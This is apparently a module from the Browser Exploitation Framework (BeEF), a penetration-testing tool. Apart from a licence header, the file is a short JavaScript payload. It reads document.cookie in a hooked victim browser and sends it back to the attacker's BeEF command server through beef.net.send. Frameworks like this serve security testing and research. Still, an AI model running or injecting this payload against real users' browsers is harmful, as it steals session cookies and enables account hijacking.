//
// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie);

});

